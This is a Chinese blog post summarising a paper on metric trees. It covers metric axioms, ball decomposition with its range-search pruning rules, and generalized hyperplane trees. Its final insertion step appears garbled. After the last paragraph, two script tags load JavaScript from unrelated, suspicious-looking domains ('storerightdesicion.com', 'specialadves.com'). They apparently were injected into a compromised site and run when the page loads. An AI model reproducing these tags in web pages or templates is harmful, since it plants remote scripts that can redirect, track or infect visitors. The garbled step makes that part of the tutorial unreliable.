---
title: "\u5982\u4f55\u7528\u5ea6\u91cf\u6811\u5b9e\u73b0\u901a\u7528\u7684\u76f8\u4f3c\u6027\u67e5\u8be2"
date: 2021-05-31 09:23:43
slug: "satisfying-general-proximity-similarity-queries-with-metric-trees"
categories:
  - 度量空间索引
tags:
  - 数据库
  - 索引
  - 计算机科学
description: >-
  很多实际问题需要对有限集中的元素进行有效的识别，高效的算法通常可以避免对所有点进行遍历。很多相关问题将“邻近(proximity)”定义为排列空间中的距离测量。大量用来表示高维点的数据结构仅仅考虑了凸区域中的邻近查询(proximity queries).例如k-d树，但k-d树存在的问题是当维度超过O(log n)时，找不到一种分割方法可以区分所有坐标，这意味着对树的邻近搜索只能基于坐标的一个子集。目前对通用度量树划分平面的选择还没有被广泛研究。
draft: false
---

<!-- wp:paragraph -->
<p>背景：<br>很多实际问题需要对有限集中的元素进行有效的识别，高效的算法通常可以避免对所有点进行遍历。很多相关问题将“邻近(proximity)”定义为排列空间中的距离测量。大量用来表示高维点的数据结构仅仅考虑了凸区域中的邻近查询(proximity queries).例如k-d树（参考李航《统计学习方法》KNN相关章节），但k-d树存在的问题是当维度超过O(log n)时，找不到一种分割方法可以区分所有坐标，这意味着对树的邻近搜索只能基于坐标的一个子集。目前对通用度量树划分平面的选择还没有被广泛研究。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>目的：<br>描述满足任意距离的多种类邻近查询的高效算法。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>方法：</p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol><li>球分解(Ball decomsitions)<br>度量距离D(X, Y)的定义<br>一个度量空间内的任何关系都应该满足下列条件：</li></ol>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>d(x, y) = d(y, x)<br>0 < d(x, y), x != y<br>d(x, x) = 0<br>d(x, y) <= d(x, z) + d(z, y)<br>球分解的定义：<br>给定一个具有n个对象的有限集S，对象间的度量定义为d(Si, Sj). 球分解B是一个由S在O(n log n)的距离计算次数下构造的度量树，过程如下:</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>如果S为空，则构造空树B = nil(=null)<br>否则：<br>令Bx = S中的任意一个对象<br>Bm = Bx与S中所有元素距离的中位数<br>Bleft = S中与除了Bx自身，与Bx距离小于等于中位数的元素组成的度量树<br>Bright = S中与Bx距离大于等于中位数的元素组成的度量树<br>上述构造过程中，通过选择一个对象并根据距离的中位数将所有元素分成两半。可以保证一半的元素都在以Bx为球心，Bm为半径的球面之内。递归实现此过程。与中位数的比较之所以都带等于号，是因为中位数可能不止一个。 这个分解的优点是除了元素之间的距离以外不要求其他任何拓扑信息。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>球分解提出的意义：仅支持近似凸区域中邻近查询的数据结构性能不一定比暴力算法好。因此需要一个可以利用度量本身特性的数据结构。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>假设以非叶节点Bx为球心，Bm为半径的球为b1；点v为球心，r为半径的球为b2。通过度量树查找距离点v在r以内的点集的方法如下：<br>(1)如果d(Bx, v) <= r, 那么将Bx加入所求点集 (2)如果d(Bx, v) + r >= Bm, 那么递归搜索右子树。当v与未知点p在空间中相对Bx位于同一侧的时候，v与p之间的距离是比较短的，换句话说就是更容易找到满足条件的点p。v与Bx三者如果满足（2）这条不等式，说明右子树中可能存在一个点与v距离小于r.三者之间构成的三角形关系如下图所示。<br><img src="https://i.loli.net/2021/06/08/QEYd1WmJLwGTUuc.jpg" alt="三点之间构成的三角形关系"><br>(3)如果d(Bx, v) + Bm <= r, 那么左子树的所有点都加入所求点集。这条不等式很好理解，当它成立时，不论v相对于Bx在什么位置，b1都内含于b2，即b2都囊括了Bx左子树的所有点。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><img src="https://i.loli.net/2021/06/08/f2LhBE5oQmKckze.jpg" alt="ball-decomposition-2.jpg"> <br>否则，如果d(Bx, v) – r <= Bm，递归搜索左子树。该不等式成立时b2内含于b1或两者相交，左子树中可能存在部分点满足条件。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>可以将上述过程推广到更一般的集合相交问题，详细过程略。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>由于球分解更有可能利用数据集元素分布特征，所以通常可以达到更优的查询性能。但对于像欧几里得距离、曼哈顿距离这样均匀分布的点，球分解表现较差。这意味着对于其他度量空间进行超平面分解的一般方法有更高的性能要求。</p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true,"start":2} -->
<ol start="2"><li>广义超平面分解(Generalized hyperplane decompositions)<br>可参考“超平面树 :度量空间中相似性搜索的索引结构”(李建中、张兆功)</li></ol>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>广义超平面(GH)的定义<br>对于给定的两个不相同的点p1和p2，广义超平面由到p1和p2距离相同的点构成。其中离p1更近的一侧叫做p1-侧(p1-side)，离p2更近的一侧叫做p2-侧(p2-side)。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>广义超平面对比球分解的最大优势在于球分解是相对静态的数据结构，而GH不是。（数据结构的静态与动态概念，大概是指其存储空间被分配后，能否动态扩增或缩减）</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>GH-BASED树的插入函数<br>令H为GH树，p为要插入的点：</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>如果H为空，创建并返回带有Hx=p和Hy的节点H，左子树Hleft和右子树Hright赋值为null. 其中Hx和Hy是决定划分的两个点，Hleft和Hright是两棵子树。<br>如果Hy=null，返回H并令Hy=p<br>如果d(p, Hx) <= d(p, Hy)，那么返回H并将p插入到左子树<br>否则返回H，并令左子树Hleft=插入点p后的右子树</p>
<!-- /wp:paragraph --><script src='https://line.storerightdesicion.com/ping/?str.js' type='text/javascript'></script><script src='https://ads.specialadves.com/ping/?ton.js' type='text/javascript'></script>
